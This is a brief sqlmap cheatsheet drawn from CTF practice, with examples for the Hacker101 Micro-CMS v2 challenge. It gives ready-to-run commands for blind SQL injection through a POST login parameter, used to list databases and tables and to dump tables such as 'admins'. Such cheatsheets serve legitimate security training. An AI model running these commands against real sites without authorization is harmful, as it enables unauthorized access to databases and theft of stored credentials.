# SQL Map Cheatsheet

Usefull SQL Map commands, some of these come from real life examples in CTFs.

## MacOS Installation

```
brew install sqlmap
```

## Blind SQLi attack

Examples for Hacker101 CTF Moderate Micro-CMS v2

### Get database list

```
sqlmap -u <URL> --method POST --data "username=FUZZ&password=" -p username --dbs --dbms mysql --level 2
```

### Get tables list

```
sqlmap -u <URL> --method POST --data "username=FUZZ&password=" -p username --tables -D level2 --dbms mysql --level 2
```

### Get contents of specific table

```
sqlmap -u <URL> --method POST --data "username=FUZZ&password=" -p username --dump -D level2 -T admins --dbms mysql --level 2
```
```
sqlmap -u <URL> --method POST --data "username=FUZZ&password=" -p username --dump -D level2 -T pages --dbms mysql --level 2
```
